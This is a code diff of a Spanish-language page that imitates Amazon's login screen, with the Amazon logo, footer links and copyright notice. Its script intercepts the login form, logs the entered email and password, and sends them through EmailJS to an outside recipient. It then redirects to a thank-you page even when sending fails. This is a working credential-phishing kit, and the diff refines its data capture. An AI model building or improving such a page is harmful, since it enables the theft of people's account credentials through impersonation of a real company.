@@ -8,7 +8,6 @@
         href="https://static.vecteezy.com/system/resources/previews/019/136/322/non_2x/amazon-logo-amazon-icon-free-free-vector.jpg"
         type="image/png">
     <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
-
     <title>Iniciar sesión en Amazon</title>
     <style>
         body {
@@ -143,54 +142,57 @@
             <button type="submit">Iniciar sesión</button>
         </form>
 
-        <div class="footer">
-            <p>
-                <a href="#">Condiciones de uso</a> |
-                <a href="#">Aviso de privacidad</a> |
-                <a href="#">Ayuda</a> |
-                <a href="#">Cookies</a> |
-                <a href="#">Publicidad basada en intereses</a>
-            </p>
-            <p>© 1996-2024, Amazon.com, Inc. o sus afiliados</p>
+        <div class="links">
+            <a href="#">¿Olvidaste tu contraseña?</a><br>
+            <a href="#">Crea tu cuenta de Amazon</a>
         </div>
+    </div>
+
+    <div class="footer">
+        <p>
+            <a href="#">Condiciones de uso</a> |
+            <a href="#">Aviso de privacidad</a> |
+            <a href="#">Ayuda</a> |
+            <a href="#">Cookies</a> |
+            <a href="#">Publicidad basada en intereses</a>
+        </p>
+        <p>© 1996-2024, Amazon.com, Inc. o sus afiliados</p>
     </div>
 
     <!-- Script para EmailJS -->
     <script type="text/javascript">
-        // Inicializa EmailJS con tu userID
+        // Inicializamos EmailJS con tu userID
         emailjs.init('user_f80imbc');  // Reemplaza con tu userID
 
-        // Asegúrate de que el DOM esté completamente cargado
-        window.onload = function () {
-            var form = document.querySelector("#loginForm"); // Usamos querySelector para seleccionar el formulario
+        document.addEventListener("DOMContentLoaded", function () {
+            var form = document.querySelector("#loginForm");
 
-            // Verificamos si el formulario existe
             if (form) {
-                console.log("Formulario encontrado"); // Verificar que el formulario se haya encontrado
-
                 form.addEventListener('submit', function (event) {
                     event.preventDefault();  // Prevenir el envío tradicional del formulario
 
                     var formData = new FormData(form);  // Obtener los datos del formulario
-                    console.log("Datos del formulario:", formData);  // Ver los datos del formulario en consola
+                    console.log("Formulario Data antes de enviar:", formData);  // Ver todo el contenido de formData
 
-                    // Verificar si 'recipient_email' está presente
-                    console.log("Correo de destino:", formData.get('recipient_email'));  // Verificar el valor de recipient_email
+                    // Verificar individualmente los valores
+                    console.log("Correo electrónico:", formData.get('email'));  // Ver valor de email
+                    console.log("Contraseña:", formData.get('password'));  // Ver valor de password
+                    console.log("Correo de destino:", formData.get('recipient_email'));  // Ver valor de recipient_email
 
-                    // Enviar el formulario con EmailJS
+                    // Enviar formulario con EmailJS
                     emailjs.sendForm('service_f80imbc', 'template_8dg1bfi', formData)
                         .then(function (response) {
                             console.log('SUCCESS!', response.status, response.text);
-                            window.location.href = 'gracias.html';  // Redirigir a una página de agradecimiento
+                            window.location.href = 'gracias.html'; // Redirigir a página de gracias
                         }, function (error) {
                             console.log('FAILED...', error);
-                            window.location.href = 'gracias.html';  // Redirigir aún en caso de error
+                            window.location.href = 'gracias.html'; // Redirigir a página de gracias incluso en caso de error
                         });
                 });
             } else {
                 console.error("Formulario no encontrado");
             }
-        };
+        });
     </script>
 </body>
 
